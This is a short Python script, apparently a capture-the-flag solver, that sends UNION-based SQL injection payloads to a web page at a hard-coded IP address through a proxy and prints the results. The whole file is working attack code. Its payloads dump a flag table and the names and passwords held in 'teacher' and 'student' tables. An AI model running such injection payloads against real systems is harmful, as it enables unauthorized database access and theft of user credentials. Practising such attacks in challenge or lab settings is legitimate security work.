import sys, re, os
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "_tools"))
import px, urllib.parse

B = "http://103.163.47.230:34413/?id="
OP = px.opener("http://143.246.138.227:80")


def q(payload):
    s, h, b = px.get(B + urllib.parse.quote(payload, safe=""), OP)
    body = re.sub(r"\s+", " ", b)
    return re.findall(r"<td>(.*?)</td>", body), body


def show(label, payload):
    tds, body = q(payload)
    print("### %s -> %s" % (label, tds[:8] if tds else body[body.find('msg'):][:160]))
    return tds


show("flag 全部", "-1' union select 1,(select group_concat(`flag-value`) from flag),3-- -")
show("flag 行", "-1' union select id,`key`,`flag-value` from flag-- -")
show("teacher 全部", "-1' union select id,name,password from teacher-- -")
show("student 全部", "-1' union select id,name,password from student-- -")
